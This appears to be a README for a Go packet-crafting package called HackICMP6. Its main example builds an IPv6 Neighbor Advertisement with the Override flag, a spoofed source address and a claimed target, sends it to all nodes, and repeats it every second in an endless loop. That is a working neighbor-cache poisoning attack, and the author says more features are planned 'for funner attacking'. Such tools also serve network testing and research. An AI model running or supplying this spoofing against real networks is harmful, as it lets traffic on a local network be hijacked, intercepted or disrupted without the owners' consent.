## HackICMP6

Simple Go package to mess with IPv6 ICMP packets

[godoc](https://godoc.org/github.com/BobBurns/hackicmp6/hi6)

This package uses the awesome songgao ether and ethernet packages.
Just type `go get` to get them.

#### Example Neighbor Advertisement with Override flag set

`import github.com/BobBurns/hackicmp6/hi6`

```go

	t := hi6.ICMP6{
		Iface:      "en0",
		DstIP:      "ff02::1",
		SrcIP:      "fe80::dead:beef",
		SrcMAC:     "10:0b:a9:ba:aa:ad",
		DstMAC:     "33:33:00:00:00:01",
		Type:       hi6.ICMPTypeNeighborAdvertisement,
		Code:       0,
		NA_Flags:   hi6.NA_FLAG_OVERRIDE,
		TargetAddr: "fe80::3",
	}

	err := t.BuildICMPPacket()
	if err != nil {
		fmt.Println("errors found...")
		fmt.Println(err)
		fmt.Println("exiting.")
		os.Exit(-1)
	}
	for {
		fmt.Printf(".")
		err = t.Send()
		if err != nil {
			fmt.Println(err)
			os.Exit(-1)
		}
		time.Sleep(time.Duration(1 * time.Second))
	}
```

For more examples see examples/

I would like to add Extention Header support as well as pcap listener for funner attacking


